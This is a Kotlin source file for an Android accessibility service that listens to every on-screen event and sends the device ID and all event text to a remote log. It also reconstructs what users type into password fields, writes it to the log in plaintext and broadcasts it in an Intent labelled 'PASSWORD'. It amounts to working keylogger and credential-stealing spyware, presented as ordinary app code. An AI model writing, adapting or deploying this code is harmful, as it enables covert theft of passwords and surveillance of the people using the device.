package com.example.remote

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.graphics.PixelFormat
import android.icu.text.SimpleDateFormat
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.LayoutInflater
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.FrameLayout
import androidx.core.content.getSystemService
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch


class MyAccessibilityService : AccessibilityService() {

    private val password = StringBuilder()


    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        GlobalScope.launch {
            Network.addLog(
                Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID),
                event.className?.toString() ?: "",
                SimpleDateFormat.getDateTimeInstance().format(event.eventTime),
                event.text.joinToString("")
            )
        }
        listenerPassword(event)
    }

    private fun listenerPassword(event: AccessibilityEvent) {
        eventChanged.tryEmit(Unit)
        val info = this.rootInActiveWindow

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            Log.e("TAG", "listenerPassword: ${event.source?.isPassword} ${info.childCount}")
            if (event.source?.isPassword == true) {
                info.getPasswordField()?.let {
                    val enteredText = it.text
                    Log.e("TAG", "listenerPassword: $enteredText")
                    // 检查字符序列的长度
                    val length = enteredText.length
                    // 如果长度比保存的密码长，那么就将新的字符添加到密码中
                    if (length > password.length) {
                        val lastChar = enteredText[length - 1]
                        password.append(lastChar)
                    } else if (length < password.length) {
                        // 如果长度比保存的密码短，那么就从密码中删除一个字符
                        password.deleteCharAt(password.length - 1)
                    }
                    Log.e("TAG", "password: $password")
                    val intent = Intent("PASSWORD")
                    intent.putExtra("data", password.toString())
                    sendBroadcast(intent)
                }
            }
        }
    }

    override fun onInterrupt() {
        // 当服务想要被中断时调用
    }

    override fun onServiceConnected() {
        // 当无障碍服务连接时的操作
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK // 监听所有事件
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = AccessibilityServiceInfo.DEFAULT
        info.notificationTimeout = 100 // 事件的通知超时时间
        serviceInfo = info

        val wm = getSystemService<WindowManager>()
        val mLayout = FrameLayout(this)
        val lp = WindowManager.LayoutParams()
        lp.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
        lp.format = PixelFormat.TRANSLUCENT
        lp.flags = lp.flags or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
        lp.width = WindowManager.LayoutParams.WRAP_CONTENT
        lp.height = WindowManager.LayoutParams.WRAP_CONTENT
        lp.gravity = Gravity.TOP
        val inflater = LayoutInflater.from(this)
        inflater.inflate(R.layout.overlay, mLayout)
        wm?.addView(mLayout, lp)
    }

    override fun onDestroy() {
        super.onDestroy()
    }

    companion object {
        var PASSWORD: String = "PASSWORD"
    }
}

fun AccessibilityNodeInfo.getPasswordField(): AccessibilityNodeInfo? {
    return if (isPassword) this
    else if (childCount > 0) {
        var s: AccessibilityNodeInfo? = null
        for (i in 0 until childCount) {
            val info = getChild(i).getPasswordField()
            if (info != null)
                s = info
        }
        s
    } else null
}
